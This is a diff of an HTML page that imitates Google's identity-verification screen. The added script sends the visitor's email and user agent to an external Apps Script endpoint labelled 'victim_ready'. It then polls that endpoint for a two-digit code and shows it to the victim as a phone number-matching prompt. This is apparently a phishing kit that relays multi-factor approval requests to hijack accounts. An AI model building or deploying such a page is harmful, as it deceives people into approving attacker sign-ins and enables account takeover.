@@ -6,7 +6,6 @@
   <title>Verifying your identity – Google</title>
   <meta name="robots" content="noindex, nofollow" />
   
-  <!-- Google Fonts -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
@@ -14,7 +13,6 @@
   <link rel="stylesheet" href="style.css" />
   
   <style>
-    /* Inline fallback styles – move to style.css in production */
     body {
       font-family: 'Roboto', system-ui, sans-serif;
       background: #f8f9fa;
@@ -99,10 +97,8 @@
   </style>
 </head>
 <body>
-
   <div class="page-center">
     <div class="card">
-      <!-- Google logo -->
       <div class="logo">
         <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
           <path fill="#EA4335" d="M24 9.5c3.54 0 6.14 1.53 7.56 2.8l5.5-5.5C33.64 3.6 29.22 1.5 24 1.5 14.98 1.5 7.2 6.68 3.44 14.24l6.66 5.18C11.84 13.3 17.42 9.5 24 9.5z"/>
@@ -112,20 +108,116 @@
         </svg>
       </div>
 
-      <!-- Avatar letter -->
       <div class="avatar" id="avatar" aria-hidden="true"></div>
 
-      <!-- Loading / waiting state -->
       <div id="loading">
         <div class="spinner" aria-hidden="true"></div>
         <h1>Verifying your identity</h1>
         <p id="status-text">Checking your account…</p>
       </div>
 
-      <!-- Number prompt state (hidden initially) -->
       <div id="prompt-section" style="display: none;" role="region" aria-live="polite">
         <h1>Check your phone</h1>
         <p>Tap <strong>Yes</strong> on the prompt sent to your device</p>
         
         <div class="security-note" style="margin: 16px 0;">
-          Match the number below with the 
+          Match the number below with the one shown on your phone:
+        </div>
+        
+        <div id="match-number" class="number-box" aria-label="Verification number">••</div>
+        
+        <p class="security-note">
+          This extra step helps keep your account secure.
+        </p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // REPLACE WITH YOUR CURRENT DEPLOYMENT URL
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzW0KUC0GE6Y-ebAV0WU-e0lf4LGyr8QN_Izdv1FhEAfSCGMPi56ohuH5LlY0uQ5by2/exec
+";
+
+    const email = localStorage.getItem("demoEmail") || "user@example.com";
+    document.getElementById("avatar").textContent = 
+      (email.split('@')[0] || "U").charAt(0).toUpperCase();
+
+    console.log("[VERIFY] Page loaded for:", email);
+
+    // Try GET victim_ready
+    const getReadyUrl = `${SCRIPT_URL}?action=victim_ready&email=${encodeURIComponent(email)}&t=${Date.now()}`;
+    console.log("[VERIFY] Sending GET victim_ready →", getReadyUrl);
+
+    fetch(getReadyUrl, {
+      method: "GET",
+      mode: "no-cors",
+      cache: "no-store"
+    })
+      .then(() => console.log("[VERIFY] GET victim_ready sent"))
+      .catch(err => console.error("[VERIFY] GET victim_ready failed:", err));
+
+    // Try POST victim_ready (more reliable)
+    const postBody = new URLSearchParams({
+      action: "victim_ready",
+      email: email,
+      ua: navigator.userAgent.substring(0, 200)
+    });
+
+    fetch(SCRIPT_URL, {
+      method: "POST",
+      mode: "no-cors",
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      body: postBody
+    })
+      .then(() => console.log("[VERIFY] POST victim_ready sent"))
+      .catch(err => console.error("[VERIFY] POST victim_ready failed:", err));
+
+    // Polling for number
+    const loadingEl = document.getElementById("loading");
+    const promptEl  = document.getElementById("prompt-section");
+    const statusEl  = document.getElementById("status-text");
+    const numberEl  = document.getElementById("match-number");
+
+    let lastDisplayedNumber = "••";
+
+    function pollForNumber() {
+      const url = `${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}&t=${Date.now()}`;
+      fetch(url, {
+        cache: "no-store",
+        mode: "cors"
+      })
+        .then(r => {
+          if (!r.ok) throw new Error(`HTTP ${r.status}`);
+          return r.json();
+        })
+        .then(data => {
+          const num = data?.prompt_number?.trim() || "";
+          if (/^\d{2}$/.test(num) && num !== lastDisplayedNumber) {
+            numberEl.textContent = num;
+            lastDisplayedNumber = num;
+            statusEl.textContent = "Number received";
+            loadingEl.style.display = "none";
+            promptEl.style.display = "block";
+            console.log("[VERIFY] Prompt received:", num);
+          }
+        })
+        .catch(() => {
+          if (promptEl.style.display !== "block") {
+            statusEl.textContent = "Waiting for verification…";
+          }
+        });
+    }
+
+    const POLL_INTERVAL_MS = 3000;
+    const pollTimer = setInterval(pollForNumber, POLL_INTERVAL_MS);
+    pollForNumber();
+
+    setTimeout(() => {
+      clearInterval(pollTimer);
+      if (promptEl.style.display !== "block") {
+        statusEl.textContent = "Verification timed out. Please try again.";
+      }
+    }, 15 * 60 * 1000);
+  </script>
+</body>
+</html>
